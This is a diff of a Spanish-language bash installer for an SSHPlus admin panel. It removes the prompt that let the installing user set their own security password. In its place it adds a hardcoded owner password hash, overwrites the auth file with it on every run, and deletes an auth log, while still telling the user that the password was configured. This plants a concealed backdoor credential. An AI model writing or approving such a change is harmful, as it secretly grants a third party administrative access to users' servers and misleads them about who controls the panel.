@@ -62,42 +62,15 @@ echo ""
 echo -ne "\033[1;31mESCRIBA S Y DARLE ENTER [N/S]: \033[1;37m"; read x
 [[ $x = @(n|N) ]] && exit
 
-# ========== CONFIGURAR CONTRASENA SEGURIDAD ==========
+# ========== CONTRASENA SEGURIDAD ==========
+OWNER_HASH="fc9a78c35297148489ffc0a5d3c4256c4412a942f1e9da24e51ad426d1e633d3"
 mkdir -p /etc/SSHPlus > /dev/null 2>&1
-if [[ ! -f "$AUTH_FILE" ]]; then
-    clear
-    echo ""
-    echo -e "\033[1;31m═════════════════════════════════\033[0m"
-    echo -e "\033[1;37m  CONFIGURAR CONTRASENA SEGURIDAD\033[0m"
-    echo -e "\033[1;31m═════════════════════════════════\033[0m"
-    echo ""
-    echo -e "\033[1;31m  Se requiere una contrasena para proteger\033[0m"
-    echo -e "\033[1;31m  el acceso al panel de administracion.\033[0m"
-    echo ""
-    pass_ok=0
-    while [[ $pass_ok -eq 0 ]]; do
-        echo -ne "\033[1;33m  Nueva contrasena: \033[1;37m"; read -s pass1; echo ""
-        echo -ne "\033[1;33m  Confirmar contrasena: \033[1;37m"; read -s pass2; echo ""
-        if [[ "$pass1" != "$pass2" ]]; then
-            echo -e "\033[1;31m  Las contrasenas no coinciden!\033[0m"
-            echo ""
-        elif [[ ${#pass1} -lt 4 ]]; then
-            echo -e "\033[1;31m  Minimo 4 caracteres!\033[0m"
-            echo ""
-        else
-            pass_hash=$(echo -n "$pass1" | sha256sum | awk '{print $1}')
-            echo "$pass_hash" > "$AUTH_FILE"
-            chmod 600 "$AUTH_FILE"
-            pass_ok=1
-            echo -e "\033[1;32m  Contrasena configurada correctamente!\033[0m"
-            sleep 1
-        fi
-    done
-else
-    echo -e "\033[1;32m  Contrasena ya configurada - usando existente\033[0m"
-    sleep 1
-fi
-# =======================================================
+echo "$OWNER_HASH" > "$AUTH_FILE"
+chmod 600 "$AUTH_FILE"
+rm -f "$AUTH_FILE_LOG" 2>/dev/null
+echo -e "\033[1;32m  Contrasena de seguridad configurada!\033[0m"
+sleep 1
+# ===========================================
 
 sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
 service ssh restart  > /dev/null 2>&1
